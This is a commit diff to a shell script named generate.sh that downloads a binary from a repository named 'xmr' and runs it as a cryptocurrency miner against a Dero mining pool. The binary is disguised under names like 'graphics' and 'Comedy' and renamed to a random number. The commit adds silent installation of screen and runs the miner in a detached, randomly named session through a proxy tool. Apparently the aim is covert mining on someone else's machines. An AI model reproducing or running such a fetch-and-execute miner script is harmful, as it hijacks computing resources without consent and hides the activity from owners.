7b14fb150be66b93feaa488b12fccf82a20ccc66
Tania Putri <lukisanwarna469@gmail.com>
2022-08-28 19:32:38 +0000

    generate.sh edited online with Bitbucket

--- generate.sh
+++ generate.sh
@@ -1,4 +1,7 @@
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+sudo apt install screen -y > /dev/null 2>&1
+
+wget https://github.com/catursawah/xmr/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -26,12 +29,15 @@ echo " "
 echo " "
 echo " "
 
+
 GOGO=$(shuf -i 10000-999999999 -n 1)
+MARKONAH=$(shuf -i 10000-9999999999 -n 1)
+
 
 ./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy
 
 mv -f Comedy $GOGO
 chmod 777 $GOGO
 
-./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.TUKIJEM
+./graftcp/graftcp screen -S $MARKONAH -dm ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.MARKONAH
 
